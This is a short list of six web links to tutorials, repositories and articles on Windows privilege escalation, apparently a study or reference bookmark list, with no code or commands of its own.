https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
https://github.com/sagishahar/lpeworkshop
https://github.com/411Hall/JAWS
https://steflan-security.com/?p=474
http://www.fuzzysecurity.com/tutorials/16.html

